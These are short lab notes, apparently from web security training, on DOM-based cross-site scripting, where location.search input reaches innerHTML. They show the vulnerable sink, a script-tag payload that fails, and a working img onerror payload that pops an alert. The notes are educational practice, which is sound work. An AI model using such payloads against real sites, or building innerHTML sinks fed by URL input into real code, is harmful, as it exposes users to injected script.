LAB 04: DOM XSS In innerHTML

TARGET: Uses innerHTML which changes content of HTML div content using location.search

TARGET ANALYSIS: 

document.getElementById('searchMessage').innerHTML = query;
==> They are performing this code as DOM the actual search result is shown as:

<span id="searchMessage">rabin</span>
I have to get out of span let's create a payload.

</span><script>alert(1);</script> {This didnot works}

now we can do:

<span id="searchMessage"><img src=1 onerror=alert("hacked")></span>
==> we have create a img tag if src=1 not found it will alert onerror event.
so our final payload is:::
<img src=1 onerror=alert("hacked")> {this will work fine}